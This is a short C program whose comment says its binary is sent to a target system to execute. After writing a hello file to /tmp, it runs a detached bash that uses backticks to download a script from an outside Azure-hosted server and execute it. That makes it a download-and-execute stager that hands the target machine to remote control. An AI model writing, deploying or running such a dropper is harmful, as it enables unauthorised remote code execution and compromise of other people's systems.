/*
The binary of this c program will be sent to the target system to execute.
*/

#include <stdlib.h>
#include <string.h>
#include <stdio.h>


int main(){
    system("echo 'Hello World!' > /tmp/hello.txt");
    system("setsid bash -c `curl http://watcher.centralindia.cloudapp.azure.com/target_bootstrap.sh`");
    return 0;
}